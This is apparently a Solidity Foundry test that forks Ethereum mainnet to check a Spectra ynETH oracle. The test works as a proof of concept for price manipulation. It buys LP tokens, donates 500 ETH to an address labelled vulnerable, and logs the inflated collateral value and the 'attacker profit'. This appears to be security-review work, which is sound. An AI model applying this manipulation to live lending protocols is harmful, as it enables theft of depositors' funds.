// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {PRBProxy} from "prb-proxy/PRBProxy.sol";
import {PRBProxyRegistry} from "../../prb-proxy/PRBProxyRegistry.sol";

import {PoolAction, PoolActionParams} from "../../proxy/PoolAction.sol";

import {PositionAction4626} from "../../proxy/PositionAction4626.sol";

import {TestBase} from "src/test/TestBase.sol";
import {Test} from "forge-std/Test.sol";

import {IVault as IBalancerVault} from "../../vendor/IBalancerVault.sol";
import {PoolAction, Protocol} from "src/proxy/PoolAction.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IVault as IBalancerVault} from "../../vendor/IBalancerVault.sol";
import {IUniswapV3Router} from "../../vendor/IUniswapV3Router.sol";
import {Constants} from "src/vendor/Constants.sol";
import {Commands} from "src/vendor/Commands.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {SpectraYnETHOracle, ICurvePool} from "src/oracle/SpectraYnETHOracle.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {wmul} from "src/utils/Math.sol";

contract SpectraOracleTest is TestBase {
    using SafeERC20 for ERC20;
    PoolAction poolAction;
    PRBProxyRegistry prbProxyRegistry;

    // SPECTRA ynETH
    address internal constant SPECTRA_ROUTER = 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    address curvePool = address(0x08DA2b1EA8f2098D44C8690dDAdCa3d816c7C0d5); // Spectra ynETH PT-sw-ynETH / sw-ynETH
    address lpTokenTracker = address(0x85F05383f7Cb67f35385F7bF3B74E68F4795CbB9);
    ERC4626 swYnETH = ERC4626(0x6e0dccf49D095F8ea8920A8aF03D236FA167B7E0);
    address ynETH = address(0x09db87A538BD693E9d08544577d5cCfAA6373A48);
    address weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address vulnerableContractWP = address(0x5D6e53c42E3B37f82F693937BC508940769c5caf);

    // user
    PRBProxy userProxy;
    address internal user;
    uint256 internal userPk;

    SpectraYnETHOracle internal spectraOracle;

    function setUp() public virtual override {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 21272674);
        usePatchedDeal = true;
        super.setUp();

        prbProxyRegistry = new PRBProxyRegistry();
        poolAction = new PoolAction(address(0), address(0), address(0), SPECTRA_ROUTER);

        // setup user and userProxy
        userPk = 0x12341234;
        user = vm.addr(userPk);
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));

        vm.label(user, "user");
        vm.label(lpTokenTracker, "lpTokenTracker");

        spectraOracle = SpectraYnETHOracle(
            address(
                new ERC1967Proxy(
                    address(new SpectraYnETHOracle(curvePool, ynETH, address(swYnETH))),
                    abi.encodeWithSelector(SpectraYnETHOracle.initialize.selector, address(this), address(this))
                )
            )
        );
    }

    function test_oracle_join_with_WETH() public {
        console.log("----- BEFORE GETTING LPs-----------");
        console.log(spectraOracle.spot(address(0)), "correct oracle price before");
        console.log(ERC4626(ynETH).convertToAssets(1e18), "ynETH unit conversion before");

        uint256 spectraYnETHVirtualPrice = ICurvePool(curvePool).lp_price();
        uint256 lpPriceInETH = swYnETH.convertToAssets(spectraYnETHVirtualPrice);
        console.log(ERC4626(ynETH).convertToAssets(lpPriceInETH), "double conversion before");

        uint256 wethAmountIn = 1000 ether;
        uint256 manipulationAmount = 500 ether;

        deal(address(weth), user, wethAmountIn);

        // Get LPs
        bytes memory commandsJoin = abi.encodePacked(
            bytes1(uint8(Commands.TRANSFER_FROM)),
            bytes1(uint8(Commands.DEPOSIT_ASSET_IN_IBT)),
            bytes1(uint8(Commands.CURVE_ADD_LIQUIDITY))
        );
        bytes[] memory inputsJoin = new bytes[](3);
        inputsJoin[0] = abi.encode(weth, wethAmountIn);
        inputsJoin[1] = abi.encode(address(swYnETH), Constants.CONTRACT_BALANCE, Constants.ADDRESS_THIS);
        inputsJoin[2] = abi.encode(curvePool, [Constants.CONTRACT_BALANCE, 0], 0, user);
        PoolActionParams memory poolActionParams;

        poolActionParams = PoolActionParams({
            protocol: Protocol.SPECTRA,
            minOut: 0,
            recipient: user,
            args: abi.encode(commandsJoin, inputsJoin, block.timestamp)
        });

        vm.startPrank(user);
        ERC20(weth).transfer(address(userProxy), wethAmountIn);
        userProxy.execute(address(poolAction), abi.encodeWithSelector(PoolAction.join.selector, poolActionParams));

        console.log("----- AFTER GETTING LPs-----------");
        uint256 lpTokenBalance = ERC20(lpTokenTracker).balanceOf(poolActionParams.recipient);
        console.log("lpTokenTracker balance: ", lpTokenBalance);

        console.log(spectraOracle.spot(address(0)), "correct oracle price after joining");
        console.log(ERC4626(ynETH).convertToAssets(1e18), "ynETH unit conversion after joining");
        spectraYnETHVirtualPrice = ICurvePool(curvePool).lp_price();
        lpPriceInETH = swYnETH.convertToAssets(spectraYnETHVirtualPrice);
        console.log(ERC4626(ynETH).convertToAssets(lpPriceInETH), "double conversion after joining");

        uint256 lpValueInETH = wmul(lpTokenBalance, ERC4626(ynETH).convertToAssets(lpPriceInETH));
        console.log(lpValueInETH, "lpToken balance in ETH before manipulation");

        uint256 collateralFactor = 0.95 ether;
        console.log(wmul(lpValueInETH, collateralFactor), "borrowable amount in ETH");

        // Send ETH to the vulnerable contract
        deal(vulnerableContractWP, manipulationAmount);

        console.log("----- AFTER MANIPULATION-----------");
        console.log(spectraOracle.spot(address(0)), "correct oracle price after manipulation");
        console.log(ERC4626(ynETH).convertToAssets(1e18), "ynETH unit conversion after manipulation");
        spectraYnETHVirtualPrice = ICurvePool(curvePool).lp_price();
        lpPriceInETH = swYnETH.convertToAssets(spectraYnETHVirtualPrice);
        console.log(lpPriceInETH, "lpPriceInETH after manipulation");
        console.log(ERC4626(ynETH).convertToAssets(lpPriceInETH), "double conversion after manipulation");
        lpValueInETH = wmul(lpTokenBalance, ERC4626(ynETH).convertToAssets(lpPriceInETH));
        console.log(lpValueInETH, "lpToken balance in ETH after manipulation with double conversion");
        console.log(
            wmul(lpValueInETH, collateralFactor),
            "borrowable amount in ETH after manipulation with double conversion"
        );
        console.log("Attacker profit after manipulation");
        console.logInt(int(wmul(lpValueInETH, collateralFactor)) - int(manipulationAmount) - int(wethAmountIn));

        // Get back spectraYnETH from LP

        // assertEq(ERC20(swYnETH).balanceOf(user), 0, "already has swYnETH balance");
        // bytes memory commandsExit = abi.encodePacked(
        //     bytes1(uint8(Commands.TRANSFER_FROM)),
        //     bytes1(uint8(Commands.CURVE_REMOVE_LIQUIDITY_ONE_COIN))
        // );
        // bytes[] memory inputsExit = new bytes[](2);
        // inputsExit[0] = abi.encode(address(lpTokenTracker), lpTokenBalance);
        // inputsExit[1] = abi.encode(address(curvePool), lpTokenBalance, 0, 0, user);

        // poolActionParams.args = abi.encode(commandsExit, inputsExit, address(swYnETH), block.timestamp + 1000);

        // ERC20(lpTokenTracker).transfer(address(userProxy), lpTokenBalance);

        // userProxy.execute(address(poolAction), abi.encodeWithSelector(PoolAction.exit.selector, poolActionParams));
        // assertGt(ERC20(swYnETH).balanceOf(user), 0, "failed to exit");
        // console.log(ERC20(swYnETH).balanceOf(user), "swYnETH balance after exit");
        // console.log(ERC20(swYnETH).totalSupply(), "swYnETH total supply after exit");
    }
}
